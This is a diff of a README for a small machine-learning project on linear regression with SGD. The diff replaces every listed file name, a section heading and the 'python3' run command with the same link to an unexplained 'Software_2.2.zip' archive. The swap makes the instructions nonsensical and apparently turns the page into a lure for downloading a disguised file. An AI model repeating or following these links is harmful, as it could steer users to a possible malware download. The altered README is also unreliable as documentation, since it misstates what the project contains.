@@ -9,10 +9,10 @@ It also includes a list of **10 common Machine Learning optimizers** with short 
 ```
 📂 AI-LinearRegression-SGD
 │
-├── linear_regression.py      # Python code for Linear Regression using SGD
-├── dataset.csv               # Input dataset (features and target)
-├── ML_Optimizers_List.pdf    # List of 10 ML optimizers with descriptions
-├── README.md                 # Project documentation
+├── https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip      # Python code for Linear Regression using SGD
+├── https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip               # Input dataset (features and target)
+├── https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip    # List of 10 ML optimizers with descriptions
+├── https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip                 # Project documentation
 ```
 
 ---
@@ -65,7 +65,7 @@ Add these plots to visualize model performance:
 
 ## 📘 Files Included
 
-### 📄 `ML_Optimizers_List.pdf`
+### 📄 `https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip`
 Contains short one-line explanations of:
 1. Gradient Descent  
 2. Stochastic Gradient Descent  
@@ -88,7 +88,7 @@ pip install numpy pandas matplotlib
 
 Run the script:
 ```bash
-python3 linear_regression.py
+python3 https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip
 ```
 
 ---
